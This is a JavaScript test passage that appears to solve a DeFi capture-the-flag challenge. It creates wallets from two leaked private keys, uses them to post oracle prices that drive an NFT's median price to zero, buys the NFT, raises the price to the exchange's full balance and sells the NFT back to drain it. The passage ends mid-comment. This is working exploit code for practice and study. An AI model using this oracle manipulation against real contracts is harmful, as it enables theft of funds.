...
describe("Compromised challenge", function () {
  ...
  it("Exploit", async function () {
    ...
    //-> Set up wallets using compromised privvate keys which we obtained from decoding the server data snippet
    //-> first decode the hex string to utf-8 and base64 decode to ASCII
    const compromisedPrivateKeyOne =
      "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
    let walletOne = new ethers.Wallet(compromisedPrivateKeyOne, ethers.provider)

    const compromisedPrivateKeyTwo =
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
    let walletTwo = new ethers.Wallet(compromisedPrivateKeyTwo, ethers.provider)

    //-> The price is calculated using median value, set up both oracles to post price of NFT as 0 so median
    //-> from 3 values becomes 0
    await this.oracle.connect(walletOne).postPrice("DVNFT", 0)
    await this.oracle.connect(walletTwo).postPrice("DVNFT", 0)

    //-> Buy NFT from exchange with funds available to attacker
    await this.exchange
      .connect(attacker)
      .buyOne({ value: ethers.utils.parseEther("0.01") })

    //-> Manipulate price again to reflect total balance of exchange
    const stealAmount = ethers.provider.getBalance(this.exchange.address)
    await this.oracle.connect(walletOne).postPrice("DVNFT", stealAmount)
    await this.oracle.connect(walletTwo).postPrice("DVNFT", stealAmount)

    //-> Approve and sell nft back to exchange
    this.nftToken.connect(attacker).approve(this.exchange.address, 0)
    this.exchange.connect(attacker).sellOne(0)

    //-> Make sure to change back oracle prices to original NFT Price to pass the last test
